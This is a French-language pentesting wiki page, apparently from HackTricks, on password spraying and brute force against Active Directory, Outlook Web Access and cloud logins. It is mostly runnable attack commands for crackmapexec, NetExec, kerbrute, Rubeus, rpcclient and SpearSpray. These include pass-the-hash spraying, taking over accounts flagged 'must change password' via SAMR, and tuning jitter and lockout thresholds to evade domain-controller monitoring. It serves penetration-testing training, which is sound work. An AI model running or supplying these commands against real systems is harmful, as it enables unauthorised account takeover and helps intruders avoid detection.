# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Une fois que vous avez trouvé plusieurs **valid usernames** vous pouvez essayer les **common passwords** les plus courants (gardez à l'esprit le **password policy** de l'environnement) avec chacun des utilisateurs découverts.\
Par **default** la **minimum** **password** **length** est **7**.

Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Remarquez que vous **could lockout some accounts if you try several wrong passwords** (par défaut plus de 10).

### Obtenir password policy

Si vous avez des user credentials ou un shell en tant que domain user, vous pouvez **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation depuis Linux (ou toutes plateformes)

- En utilisant **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Utiliser **NetExec (successeur de CME)** pour du spraying ciblé et peu bruyant via SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Utiliser [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(vous pouvez indiquer le nombre de tentatives pour éviter les verrouillages):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Utiliser [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NON RECOMMANDÉ PARFOIS NE FONCTIONNE PAS
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Avec le `scanner/smb/smb_login` module de **Metasploit** :

![](<../../images/image (745).png>)

- En utilisant **rpcclient** :
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Depuis Windows

- Avec [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Avec [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Il génère par défaut les utilisateurs du domaine, récupère la politique de mot de passe du domaine et limite les tentatives en conséquence):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Avec [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifier et prendre le contrôle des comptes "Password must change at next logon" (SAMR)

Une technique à faible bruit consiste à spray un benign/empty password et à détecter les comptes renvoyant STATUS_PASSWORD_MUST_CHANGE, ce qui indique que le password a été expiré de force et peut être changé sans connaître l'ancien.

Workflow:
- Énumérer les utilisateurs (RID brute via SAMR) pour construire la liste des cibles :

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray un mot de passe vide et continuez sur les hits pour capturer les comptes qui doivent changer au prochain logon :
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Pour chaque hit, changez le mot de passe via SAMR avec le module NetExec (aucun ancien mot de passe nécessaire lorsque "must change" est activé) :
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Notes opérationnelles :
- Assurez-vous que l'horloge de votre hôte est synchronisée avec le DC avant les opérations basées sur Kerberos : `sudo ntpdate <dc_fqdn>`.
- Un [+] sans (Pwn3d!) dans certains modules (p. ex., RDP/WinRM) signifie que les creds sont valides mais que le compte n'a pas les droits de connexion interactive.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Le spraying basé sur Kerberos pre-auth réduit le bruit par rapport aux tentatives de bind SMB/NTLM/LDAP et s'aligne mieux sur les politiques de verrouillage AD. SpearSpray combine le ciblage piloté par LDAP, un moteur de patterns et la prise en compte des politiques (policy de domaine + PSOs + tampon badPwdCount) pour effectuer le spraying de manière précise et sûre. Il peut aussi taguer les principals compromis dans Neo4j pour le pathing BloodHound.

Key ideas:
- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
- Filtrage tenant compte de la policy de verrouillage du domaine + PSO pour laisser un tampon configurable d'essais (threshold) et éviter de verrouiller les utilisateurs.
- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
- Throughput control with threads, jitter, and max requests per second.
- Optional Neo4j integration to mark owned users for BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Ciblage et contrôle des motifs:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Contrôles de furtivité et de sécurité :
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound enrichissement:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Aperçu du système de modèles (patterns.txt) :
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Variables disponibles :
- {name}, {samaccountname}
- Temporels à partir de pwdLastSet (ou whenCreated) de chaque utilisateur : {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Aides de composition et org token : {separator}, {suffix}, {extra}

Remarques opérationnelles :
- Privilégiez l'interrogation du PDC-emulator avec -dc pour lire les valeurs de badPwdCount et les informations liées aux politiques les plus fiables.
- Les remises à zéro de badPwdCount sont déclenchées lors de la tentative suivante après la fenêtre d'observation ; utilisez un seuil et un timing pour rester prudent.
- Les tentatives Kerberos pre-auth apparaissent comme 4768/4771 dans la télémétrie du DC ; utilisez du jitter et du rate-limiting pour vous fondre dans la masse.

> Astuce : la taille de page LDAP par défaut de SpearSpray est 200 ; ajustez avec -lps si nécessaire.

## Outlook Web Access

Il existe plusieurs outils pour p**assword spraying outlook**.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Pour utiliser l'un de ces outils, vous avez besoin d'une liste d'utilisateurs et d'un mot de passe / d'une petite liste de mots de passe pour le password spraying.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Références

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
